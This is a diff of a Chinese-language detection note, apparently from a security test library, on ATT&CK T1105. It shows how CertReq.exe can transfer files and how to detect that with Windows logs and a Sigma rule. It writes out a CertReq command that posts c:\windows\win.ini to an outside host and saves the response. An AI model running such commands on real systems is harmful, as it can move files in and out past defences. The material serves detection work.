@@ -5,29 +5,33 @@
 攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
 
 ## 测试案例
+
 CertReq.exe用于从证书颁发机构请求证书 (CA) ，从CA检索对以前的请求的响应，从.inf文件创建新请求，以接受和安装对请求的响应，以从现有CA证书或请求构造交叉认证或限定的次序请求， 并签署交叉认证或限定的下级请求。
 
 **路径:**
-```
+
+```YML
 - C:\Windows\System32\certreq.exe
 - C:\Windows\SysWOW64\certreq.exe
 ```
 
 将来自www.baidu.com的HTTP POST的响应内容保存到端点上，输出output.txt在当前目录中。
-```
+
+```YML
 CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 ```
 
 用例：从 Internet 下载文件
 所需权限：用户
 操作系统：Windows Vista、Windows 7、Windows 8、Windows 8.1、Windows 10
+
 ## 检测日志
 
 windows安全日志
 
 ## 测试复现
 
-```
+```YML
 C:\Users\liyang\Desktop\asptest>CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 OK
 HTTP/1.1 200 OK
@@ -46,7 +50,8 @@ Vary: Accept-Encoding,User-Agent
 ```
 
 ## 测试留痕
-```
+
+```YML
 已创建新进程。
 
   
@@ -91,8 +96,11 @@ Vary: Accept-Encoding,User-Agent
 
 进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 ```
+
 ## 检测方法/思路
+
 参考Sigma官方规则:
+
 ```yml
 title: Suspicious Certreq Command to Download
 
@@ -157,7 +165,9 @@ level: high
 ```
 
 ### 建议
+
 从Sigma给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
+
 ## 参考推荐
 
 MITRE-ATT&CK-T1105
